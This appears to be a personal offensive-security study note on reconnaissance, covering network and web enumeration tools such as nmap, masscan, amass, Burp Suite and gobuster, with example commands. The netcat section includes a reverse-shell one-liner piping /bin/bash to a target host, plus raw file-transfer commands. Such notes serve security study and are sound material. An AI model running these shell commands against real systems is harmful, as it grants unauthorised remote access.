---
title: 01_Reconnaissance
draft: false
tags:
  - offensive-security
  - reconnaissance
  - unified-kill-chain
NeedsReview: true
---
# Reconnaissance

> [!abstract] Summary  
> Reconnaissance is the initial phase in the [Unified Kill Chain](00_Unified%20Kill%20Chain%20(UKC).md), where the attacker gathers information about the target without actively engaging with it.  
> 
> **"Reconnaissance is 90% of the job in Ethical Hacking. This is where you find most vulnerabilities. The rest is about scaling the impact."** - Adrian Bacceli



This phase is typically divided into two types:

## 🕵️ Passive Reconnaissance

Tools and techniques that don't directly interact with the target systems, thus reducing the chances of detection.

- [Shodan](Shodan.md): Search engine for internet-connected devices.
- [Wappalyzer](Wappalyzer.md): Browser extension or CLI tool to identify technologies used by a target website.
- Dark Web & Breach Reconnaissance ==**(Work In Progress)**==
- App Specific Passive Reconnaissance: Reverse engineering APKs, firmware analysis ==**(Work In Progress)**==
- Social Engineering Passive Reconnaissance - LinkedIn stalking, email scraping ==**(Work In Progress)**==

---
## ⚡ Active Reconnaissance

Involves direct interaction with the target, potentially triggering alerts.

### Network Reconnaissance
#### 🔍 `nc` [[Netcat]] vs [[Nmap]]

**Manual Banner Grabbing / Custom Payloads**
`nc` allows you to **manually connect to a port** and send **custom input** to see how the service responds.
Example:

```bash
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80
```

This is useful for **interacting with obscure or custom services** where `nmap`'s scripts might not work.

---

**Reverse Shells and Bind Shells**

`nc` can be used to **set up reverse or bind shells**, which is useful in post-exploitation or red teaming.

Example:

```bash
nc -lvnp 4444  # Listener
nc target.com 4444 -e /bin/bash  # Reverse shell
```

`nmap` is not designed for this kind of interaction.

---

**Simple TCP/UDP Client**

`nc` can act as a **lightweight TCP or UDP client**, useful for testing connectivity or service behavior.

Example:

```bash
nc -u target.com 53  # UDP DNS port
```

---

**Port Knocking**
You can use `nc` to simulate **port knocking** sequences manually, which `nmap` doesn’t support natively.

---

**File Transfers**
`nc` can be used to **transfer files** between systems over a raw TCP connection.
Example:

``` bash 
# Sender 
nc -l -p 1234 < file.txt 

# Receiver 
nc target.com 1234 > file.txt`
```

---
#### 🛠️ What `nmap` Does Better
- **Automated scanning and service detection**
- **OS fingerprinting**
- **Scriptable interactions via NSE (Nmap Scripting Engine)**
- **Network topology mapping**
- **Vulnerability detection
- **
---
#### 🧰 Other Essential Network Enumeration Tools
##### 1. **Masscan**
- **Purpose**: Extremely fast port scanner (like `nmap` but faster).
- **Use Case**: Scanning large IP ranges quickly.
- **Note**: Doesn't do service detection like `nmap`.
``` bash
masscan -p1-65535 192.168.1.0/24 --rate=10000
```

---

##### 2. **Netdiscover**
- **Purpose**: ARP-based network discovery tool.
- **Use Case**: Identifying live hosts on a local subnet (great for internal networks).
``` bash
netdiscover -r 192.168.1.0/24
```

---
##### 3. **Fping**
- **Purpose**: Fast ICMP ping sweeper.
- **Use Case**: Quickly identify live hosts.
``` bash
fping -a -g 192.168.1.0/24
```

---
##### 4. **Hping3**
- **Purpose**: Packet crafting tool.
- **Use Case**: Advanced scanning, firewall testing, and TCP/IP stack auditing.
``` bash
hping3 -S -p 80 -c 1 target.com
```

---
##### 5. **ZMap**
- **Purpose**: Internet-wide network scanner.
- **Use Case**: High-speed scanning of large address spaces (used in research).

---
##### 6. **Amass**
- **Purpose**: DNS enumeration and attack surface mapping.
- **Use Case**: Subdomain discovery and external asset mapping.
``` bash
amass enum -d example.com
```

---
##### 7. **Nessus / OpenVAS**
- **Purpose**: Vulnerability scanners.
- **Use Case**: Deep enumeration of services and known vulnerabilities.

---
##### 8. **Recon-ng**
- **Purpose**: Web-based reconnaissance framework.
- **Use Case**: OSINT and passive network enumeration.

---
#### 🧠 Summary

| Tool               | Primary Use                      | Strengths                      |
| ------------------ | -------------------------------- | ------------------------------ |
| `nmap`             | Port/service/OS detection        | Versatile, scriptable          |
| `nc`               | Manual interaction, shell access | Lightweight, flexible          |
| `masscan`          | Fast port scanning               | Speed                          |
| `netdiscover`      | Local network discovery          | ARP-based, simple              |
| `fping`            | ICMP sweep                       | Fast, efficient                |
| `hping3`           | Packet crafting                  | Custom scans, firewall testing |
| `zmap`             | Internet-wide scanning           | Research-grade speed           |
| `amass`            | DNS and subdomain enumeration    | External recon                 |
| `Nessus`/`OpenVAS` | Vulnerability scanning           | Deep service analysis          |

| Feature                | `nc` (Netcat) ✅ | `nmap` ✅             |
| ---------------------- | --------------- | -------------------- |
| Manual banner grabbing | ✅               | ⚠️ (limited via NSE) |
| Reverse/bind shell     | ✅               | ❌                    |
| File transfer          | ✅               | ❌                    |
| Port scanning          | ⚠️ (basic)      | ✅                    |
| OS/service detection   | ❌               | ✅                    |
| Scriptable enumeration | ❌               | ✅ (NSE)              |

####  Additional Techniques (Work In Progress)

##### 1. **SMB/NetBIOS Enumeration**

- Useful in internal networks for discovering shares, users, and machines.
- Tools:
    - `enum4linux`
    - `smbclient`
    - `smbmap`
    - `nmap` NSE scripts (`smb-enum-shares`, `smb-enum-users`)

##### 2. **SNMP Enumeration**

- If SNMP is open (UDP 161), it can leak system info, routing tables, etc.
- Tools:
    - `snmpwalk`
    - `onesixtyone`
    - `nmap` NSE (`snmp-info`, `snmp-interfaces`)

##### 3. **LDAP Enumeration**

- Common in Active Directory environments.
- Tools:
    - `ldapsearch`
    - `nmap` NSE (`ldap-search`, `ldap-rootdse`)

##### 4. **RPC Enumeration**

- Useful for enumerating users and groups on Windows systems.
- Tools:
    - `rpcclient`
    - `nmap` NSE (`rpcinfo`, `msrpc-enum`)

##### 5. **VoIP Enumeration (SIP)**

- If SIP (port 5060) is open, you can enumerate extensions.
- Tools:
    - `svmap`, `svwar`, `sipvicious`

##### 6. **NFS Enumeration**

- If NFS is exposed, you can list and mount shares.
- Tools:
    - `showmount`
    - `mount`
    - `nmap` NSE (`nfs-showmount`, `nfs-ls`)

##### 7. **RDP/SSH/VNC Banner Grabbing**

- Use `nmap`, `hydra`, or `rdpscan` to identify versions and test brute-force.

##### 8. **Nmap NSE Scripting (Deep Dive)**

- You mention NSE, but it’s worth emphasizing:
    - Vulnerability detection (`http-vuln-*`, `smb-vuln-*`)
    - Auth bypass (`http-auth-finder`)
    - Brute-force (`ftp-brute`, `ssh-brute`, etc.)
    - Malware detection (`http-malware-host`)

---

##### 🧰 Optional Tools to Mention

| Tool           | Purpose                               |
| -------------- | ------------------------------------- |
| `Responder`    | LLMNR/NBT-NS poisoning (internal)     |
| `CrackMapExec` | Post-recon enumeration & exploitation |
| `Metasploit`   | Auxiliary scanners and exploits       |
| `Ncrack`       | Network authentication brute-forcer   |


--- 
### Web Reconnaissance

#### 🕸️ What is Spidering?

**Spidering** (also called **web crawling**) is the process of **automatically browsing a website** to discover and map its structure, content, and links. It’s a foundational technique in both **ethical hacking** and **search engine indexing**.

---

##### 🔍 How Spidering Works

A **spider** (or crawler) starts at a given URL and:

1. **Downloads the page**
2. **Extracts all links** (internal and sometimes external)
3. **Follows those links** to new pages
4. Repeats the process recursively

This builds a **map of the site**, including:

- Pages
- Forms
- Parameters
- Scripts
- Hidden or unlinked content

---

##### 🧰 Spidering in Ethical Hacking

|**Purpose**|**Example**|
|---|---|
|**Reconnaissance**|Discover hidden pages or admin panels|
|**Attack Surface Mapping**|Identify all reachable endpoints|
|**Parameter Discovery**|Find GET/POST parameters for fuzzing or injection|
|**Session/Token Analysis**|Observe how cookies and tokens are used|
|**Form Enumeration**|Detect login, search, or upload forms|

---

##### 🛠️ Tools That Perform Spidering

- **Burp Suite Spider**: Interactive and passive crawling with session handling
- **OWASP ZAP Spider**: Open-source alternative with automation support
- **Nikto**: Includes basic spidering for vulnerability scanning
- **Custom Scripts**: Python (e.g., `requests + BeautifulSoup`), Go, etc.

---

##### 🧠 Spidering vs. Brute-Forcing

|Spidering|Brute-Forcing|
|---|---|
|Follows real links|Guesses paths using wordlists|
|Passive or semi-passive|Active and noisy|
|Maps known content|Finds hidden/unlinked content|

##### 🚫Limitations of Spidering

- **JavaScript-heavy sites** may hide content from basic spiders.
- **Authentication walls** can block access to deeper pages.
- **Rate-limiting or WAFs** may detect and block spiders.
- **Robots.txt** may restrict crawling (though not enforced in hacking contexts).





---
#### 🧩 What is "Burping"?

**Burping** is a slang term used by penetration testers to describe the process of:

1. **Intercepting web traffic** using [[Burpsuite|Burp Suite]]’s proxy.
2. **Inspecting and modifying requests/responses**.
3. **Spidering the application** to discover endpoints.
4. **Testing for vulnerabilities** like SQL injection, XSS, CSRF, etc.

---

##### 🧰 What You Do When You “Burp” a Site

|Step|Action|
|---|---|
|**1. Configure Proxy**|Set your browser to route traffic through Burp (usually `127.0.0.1:8080`)|
|**2. Intercept Requests**|Use the **Proxy** tab to view and modify HTTP/S requests|
|**3. Spider the Site**|Automatically crawl the site to discover pages and parameters|
|**4. Send to Repeater/Intruder**|Manually test or automate attacks on specific requests|
|**5. Analyze Responses**|Look for anomalies, errors, or signs of vulnerabilities|

---

##### 🔍 Why Burping is Useful

- Helps you understand how the application works behind the scenes.
- Reveals hidden parameters, cookies, headers, and tokens.
- Allows you to test how the app handles malformed or malicious input.

> 🧠 **In short**: “Burping a site” means **analyzing and manipulating its traffic using Burp Suite** to uncover vulnerabilities or hidden behavior.




---
#### 🛠️ What is Brute-Force Enumeration?

**Brute-force enumeration** is a technique used in ethical hacking to **systematically guess or test values** (like usernames, directories, subdomains, or passwords) by trying many possibilities from a predefined list — often called a **wordlist**.

It’s called “brute-force” because it doesn’t rely on logic or discovery — it simply **tries everything** until something works.

---

##### 🔍 Common Types of Brute-Force Enumeration

| **Type**                   | **Target**                                 | **Example Tool**                      |
| -------------------------- | ------------------------------------------ | ------------------------------------- |
| **Directory Enumeration**  | Hidden folders/files on a web server       | `Gobuster`, `ffuf`, `dirsearch`       |
| **Subdomain Enumeration**  | Hidden subdomains of a domain              | `Gobuster dns`, `Amass`, `Sublist3r`  |
| **Username Enumeration**   | Valid usernames on a login page or service | `Hydra`, `Medusa`, `Burp Intruder`    |
| **Password Brute-Forcing** | Passwords for known usernames              | `Hydra`, `John the Ripper`, `Hashcat` |
| **VHost Enumeration**      | Virtual hosts on a shared IP               | `Gobuster vhost`, `ffuf`              |

---

##### 🧠 How It Works

1. **Choose a target** (e.g., a login form or web server).
2. **Select a wordlist** (e.g., common passwords, directory names).
3. **Run the tool** to test each word in the list.
4. **Analyze the responses** to identify valid entries (e.g., 200 OK, login success, etc.).

---

##### ⚠️ Considerations

- **Noisy**: Brute-force attacks generate a lot of traffic and can trigger alarms.
- **Rate-limited**: Many systems throttle or block repeated requests.
- **Ethical use only**: Always have permission before performing brute-force enumeration.

#### Other steps to check ==**(Work In Progress)**==
##### 🔍 **1. HTTP/HTTPS Inspection**

- **Inspect headers** for server info, cookies, security headers.
- Tools: `curl`, `httpie`, Burp, OWASP ZAP

##### 🧪 **2. Input Field Testing (Manual or Automated)**

- Check how forms handle input (e.g., login, search, contact).
- Tools: Burp Repeater, ZAP, `wfuzz`, `ffuf`

##### 🧬 **3. JavaScript & Client-Side Recon**

- Analyze JS files for hidden endpoints, API keys, logic.
- Tools: `LinkFinder`, `JSParser`, browser dev tools

##### 🔐 **4. Authentication & Session Handling**

- Test login/logout, session fixation, token reuse, cookie flags.
- Tools: Burp Suite, Postman

##### 📡 **5. WebSocket & API Enumeration**

- Discover and interact with WebSocket or REST/GraphQL APIs.
- Tools: Burp WebSocket history, Postman, GraphQL Voyager

##### 🧭 **6. CORS & CSP Testing**

- Look for misconfigurations in CORS or Content Security Policy.
- Tools: `Corsy`, Burp extensions

##### 🧱 **7. WAF/Rate Limiting Detection**

- Identify protections that may block or throttle your scans.
- Tools: `wafw00f`, manual testing with delays

##### 🧰 **8. CMS/Framework-Specific Recon**

- Target known CMS like WordPress, Joomla, etc.
- Tools: `wpscan`, `droopescan`, `joomscan`

##### 🧪 **9. Active Vulnerability Scanning**

- Scan for known CVEs or misconfigurations.
- Tools: `Nikto`, `Nuclei`, `OpenVAS`, `Burp Scanner` (Pro)

##### 🧠 **10. Logic & Workflow Testing**

- Test how the app behaves in edge cases (e.g., bypassing steps, skipping tokens).
- Tools: Manual + Burp Suite

---

##### 🧩 Optional Advanced Additions

- **Fuzzing**: Discover unexpected behavior by sending malformed input (`wfuzz`, `ffuf`, Burp Intruder).
- **Timing Attacks**: Detect blind SQLi or logic flaws via response delays.
- **Error Message Analysis**: Trigger and analyze stack traces or debug info.

---

### **Host-Based Reconnaissance** ==**(Work In Progress)**==
### **Wireless Reconnaissance** ==**(Work In Progress)**==
### **Cloud Reconnaissance** ==**(Work In Progress)**==
### **Application-Specific Recon** ==**(Work In Progress)**==

E.g. Interacting with APIs, fuzzing, hooking with Frida
### **Social Engineering Active Reconnaissance** ==**(Work In Progress)**==
Phishing, pretext calls, impersonation

## 🔗 See Also

- [02_Resource Development](02_Resource%20Development.md) *(next stage in the Unified Kill Chain)*
